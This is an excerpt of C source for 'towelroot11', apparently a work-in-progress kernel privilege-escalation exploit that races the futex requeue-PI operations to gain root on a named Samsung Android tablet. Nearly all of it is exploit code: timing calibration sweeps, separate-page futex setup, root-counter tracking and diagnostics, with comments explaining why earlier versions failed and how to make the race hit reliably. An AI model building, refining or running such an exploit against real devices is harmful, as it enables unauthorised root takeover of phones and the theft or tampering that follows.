/*
 * towelroot11.c — FIX: F1 and F2 on separate physical pages
 *
 ...
 *
 * FIXES over towelroot10:
 *
 *   ROOT CAUSE — F1 and F2 on the same physical page → EINVAL:
 *     All prior versions placed F1=fmem[0] and F2=fmem[16] in the SAME mmap.
 *     Both are on the same physical page. The kernel's futex_requeue() for
 *     FUTEX_CMP_REQUEUE_PI checks: if (hb1 == hb2 && requeue_pi) return -EINVAL.
 *     When both futexes hash to the same bucket (guaranteed when on same physical
 *     page with identical offset fields), EVERY CMP_REQUEUE_PI call returns -1/EINVAL.
 *     This caused 0% requeue hits across ALL delta values in towelroot5-10.
 *     Confirmed: towelroot10 diagnostic showed errno=22 on all CMP_REQUEUE_PI calls.
 *
 *   FIX 4 — Two separate mmap() calls for F1 and F2.
 *     Different mmaps → different anonymous inodes → different futex keys.
 *     The futex hash is jhash2(pgoff, inode, offset). With different inodes,
 *     F1 and F2 will almost certainly hash to different buckets.
 *     (Worst case same-bucket probability: 1/256 ≈ 0.4%; use two mmaps to avoid.)
 *     towelroot8 had `sched_yield()` in the tight spin loop where victim waits
 *     for a new g_round value. When main increments g_round and immediately
 *     starts spin_us(T-delta), victim may be mid-sched_yield() — off CPU 0 for
 *     5-10ms (one Android scheduling quantum). Main fires CMP_REQUEUE_PI while
 *     victim hasn't even called WAIT_REQUEUE_PI yet → 0 hits at ALL deltas.
 *     This explains the towelroot8 result (0% hits at +2000µs, +1500µs, etc.)
 *
 *   FIX 3 — Remove sched_yield from victim's wait loop. Use a pure tight-spin
 *     with only a memory barrier. Victim stays on CPU 0, sees g_round within
 *     ~1µs (L2 cache coherence), and enters the futex within ~10µs of main's
 *     g_round increment. With T=5ms and delta=+2000µs (fire at 3ms), victim
 *     has been in the futex for ~2990µs when main fires → ~100% hits.
 *
...
/* ========== Futex layout — SEPARATE physical pages (critical!) ========== */
/*
 * F1 and F2 MUST be on different physical pages.
 * The kernel's futex_requeue() for CMP_REQUEUE_PI checks hb1 != hb2 (the two
 * futexes must hash to different hash buckets). For shared futexes, the hash
 * is based on (inode, pgoff, offset_in_page). Two futexes on the SAME physical
 * page with the same offset_in_page would hash to the same bucket → EINVAL.
 * Fix: use separate mmap() calls → separate anonymous inodes → different hash.
 */
static volatile int *fmem1; /* F1 lives here */
static volatile int *fmem2; /* F2 lives here */
#define F1  ((volatile int *)fmem1)
#define F2  ((volatile int *)fmem2)
...
static atomic_int g_eagains    = ATOMIC_VAR_INIT(0);
static atomic_int g_root      = ATOMIC_VAR_INIT(0);
static atomic_int g_cmp_errors = ATOMIC_VAR_INIT(0); /* CMP_REQUEUE_PI returned -1 */
static atomic_int g_diag_done  = ATOMIC_VAR_INIT(0); /* print first N diagnostics */
...
static void *victim_thread(void *arg) {
    ...
    while (1) {
        ...
        /* Wait for main to start a new round — TIGHT SPIN, no sched_yield.
         *
         * sched_yield() here (towelroot8 bug) causes victim to be preempted
         * for a full Android scheduling quantum (5-10ms at HZ=100-250) right
         * when main starts firing. Victim is off CPU 0 and never calls
         * WAIT_REQUEUE_PI before main fires → 0% hits at all deltas.
         *
         * Fix: pure tight-spin with only a compiler memory barrier.
         * Victim stays on CPU 0, sees g_round within ~1µs, enters futex
         * within ~10µs. Main fires at (T-delta)µs ≥ 2980µs → 100% hits.
         */
        int r;
        do {
        ...
        /* Diagnostic: print first 5 victim outcomes */
        if (atomic_fetch_add(&g_diag_done, 1) < 5) {
            char buf[128];
            int n = snprintf(buf, sizeof(buf),
                "[DBG victim] WAIT_REQUEUE_PI ret=%d errno=%d *F1=%d *F2=%d\n",
                ret, err, *F1, *F2);
            write(2, buf, n);
        }
        ...
        if (ret == 0) {
            ...
            /* *F1 != 0 when we called WAIT_REQUEUE_PI — shouldn't happen */
            atomic_fetch_add(&g_eagains, 1);
...
static int race_once(int delta_us, int *requeued) {
    ...
    *F2 = 0;
    ...
    int rq_errno = errno;
    /* Diagnostic: always print first 5 CMP_REQUEUE_PI results */
    {
        static int cmp_dbg = 0;
        if (__sync_fetch_and_add(&cmp_dbg, 1) < 5) {
            char buf[128];
            int n = snprintf(buf, sizeof(buf),
                "[DBG main] CMP_REQUEUE_PI rq=%d errno=%d *F1=%d *F2=%d spin=%lldµs\n",
                rq, rq_errno, *F1, *F2, actual_us);
            write(2, buf, n);
        }
    }
    if (rq < 0) atomic_fetch_add(&g_cmp_errors, 1);
...
static int calibration_sweep(int timeout_us, int iters_per_delta, int bulk_iters) {
    ...
    printf("[*]   delta     hits  race_events  eagains  anomalies\n");
    fflush(stdout);
    ...
    for (int d = 0; d < ndelta; d++) {
        ...
        int ea0   = atomic_load(&g_eagains);
        int ce0   = atomic_load(&g_cmp_errors);
        ...
        int new_ea = atomic_load(&g_eagains)     - ea0;
        int new_ce = atomic_load(&g_cmp_errors)  - ce0;
        int pct    = hits * 100 / iters_per_delta;

        printf("[*]  %+6dµs   %3d%%  race=%d eagain=%d cmperr=%d anom=%d uid=%d\n",
               delta, pct, new_re, new_ea, new_ce, new_an, getuid());
        fflush(stdout);
...
/* ========== Main ========== */
int main(void) {
    printf("=== towelroot10 — DIAGNOSTIC BUILD — SM-T377A ===\n");
    ...
    /* Extended futex op capability test */
    {
        volatile int f1 = 0, f2 = 0;
        int rq, rq_errno;

        /* Test 1: CMP_REQUEUE_PI shared (op=12) — separate stack vars, same page */
        syscall(SYS_futex, (int*)&f2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
        rq = (int)syscall(SYS_futex, (int*)&f1, FUTEX_CMP_REQUEUE_PI, 0,
                          (void *)(intptr_t)1, (void *)&f2, 0);
        rq_errno = errno;
        syscall(SYS_futex, (int*)&f2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        printf("[*] CMP_REQUEUE_PI shared(12):  rq=%d errno=%d\n", rq, rq < 0 ? rq_errno : 0);

        /* Test 2: CMP_REQUEUE_PI private (op=12|128=140) */
        f1 = 0; f2 = 0;
        syscall(SYS_futex, (int*)&f2, FUTEX_LOCK_PI|FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
        rq = (int)syscall(SYS_futex, (int*)&f1, FUTEX_CMP_REQUEUE_PI|FUTEX_PRIVATE_FLAG, 0,
                          (void *)(intptr_t)1, (void *)&f2, 0);
        rq_errno = errno;
        syscall(SYS_futex, (int*)&f2, FUTEX_UNLOCK_PI|FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
        printf("[*] CMP_REQUEUE_PI private(140): rq=%d errno=%d\n", rq, rq < 0 ? rq_errno : 0);

        /* Test 3: REQUEUE_PI shared (op=9) */
        f1 = 0; f2 = 0;
        syscall(SYS_futex, (int*)&f2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
        rq = (int)syscall(SYS_futex, (int*)&f1, 9 /* FUTEX_REQUEUE_PI */, 0,
                          (void *)(intptr_t)1, (void *)&f2, 0);
        rq_errno = errno;
        syscall(SYS_futex, (int*)&f2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        printf("[*] REQUEUE_PI shared(9):        rq=%d errno=%d\n", rq, rq < 0 ? rq_errno : 0);

        /* Test 4: REQUEUE_PI private (op=9|128=137) */
        f1 = 0; f2 = 0;
        syscall(SYS_futex, (int*)&f2, FUTEX_LOCK_PI|FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
        rq = (int)syscall(SYS_futex, (int*)&f1, 9|FUTEX_PRIVATE_FLAG, 0,
                          (void *)(intptr_t)1, (void *)&f2, 0);
        rq_errno = errno;
        syscall(SYS_futex, (int*)&f2, FUTEX_UNLOCK_PI|FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
        printf("[*] REQUEUE_PI private(137):     rq=%d errno=%d\n", rq, rq < 0 ? rq_errno : 0);
        fflush(stdout);
    }
    ...
    fmem1 = (volatile int *)mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                                  MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    fmem2 = (volatile int *)mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                                  MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (fmem1 == MAP_FAILED || fmem2 == MAP_FAILED) { perror("mmap"); return 1; }
    printf("[*] F1=%p F2=%p (separate pages: inode/hash should differ)\n",
           (void *)fmem1, (void *)fmem2);
